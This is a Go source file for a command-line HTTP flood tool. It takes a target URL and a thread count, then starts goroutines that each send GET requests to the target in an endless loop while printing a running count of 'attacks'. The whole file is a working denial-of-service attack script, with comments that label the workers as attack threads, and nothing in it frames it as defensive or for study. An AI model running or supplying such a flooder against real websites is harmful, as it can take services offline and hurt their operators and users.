package main

import (
	"flag"
	"fmt"
	"net/http"
	"sync"
)

var wg sync.WaitGroup

func cc(url string, num int) {
	num2 := 0
	for true {
		num2++
		http.Get(url)
		fmt.Printf("The current thread is %d and the number of attacks is %d\n", num, num2)
	}
	wg.Done()
}

//url
var u = flag.String("u", "", "url: url address")

//攻击线程
var c = flag.Int("c", 0, "concurrent: concurrent number")

//主线程
func main() {

	//解析命令行参数
	flag.Parse()

	//传值
	url := *u
	concurrent := *c

	for i := 1; i <= concurrent; i++ {
		wg.Add(1)
		fmt.Println("Thread created: ", i)
		go cc(url, i)
	}
	wg.Wait()
}
